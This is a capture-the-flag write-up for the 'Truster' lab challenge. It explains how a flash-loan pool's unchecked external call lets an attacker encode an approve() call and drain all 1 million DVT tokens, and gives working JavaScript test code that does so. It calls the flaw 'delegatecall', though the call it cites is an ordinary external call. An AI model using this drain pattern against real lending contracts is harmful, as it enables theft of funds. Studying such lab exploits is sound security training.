# Challenge #3 - Truster   
 More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

 Currently the pool has 1 million DVT tokens in balance. And you have nothing.

 But don't worry, you might be able to take them all from the pool. In a single transaction.

## Exploit
In this challenge, the smart contract is vulnerable to delegatecall, where the attacker can 
execute some logic functionality on behalf of the smart contract in the ``target.functionCall(data)`` 
on line 36 on the ``flashloan()``.  

Knowing this, we can send some data to the ``flashLoan()`` to approve the attacker to tranfer 
himself any amount of funds, draining the contract.   
 
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
		const abi = [
			"function approve(address spender, uint256 amount) external returns (bool)",
			"function transfer(address to, uint amount)"
		];
		const iface = new ethers.utils.Interface(abi);
		const data = iface.encodeFunctionData("approve", [attacker.address, ethers.utils.parseEther('100000000')]);
		await this.pool.flashLoan(0, attacker.address, this.token.address, data);
		this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, ethers.utils.parseEther('1000000'));
    });
```
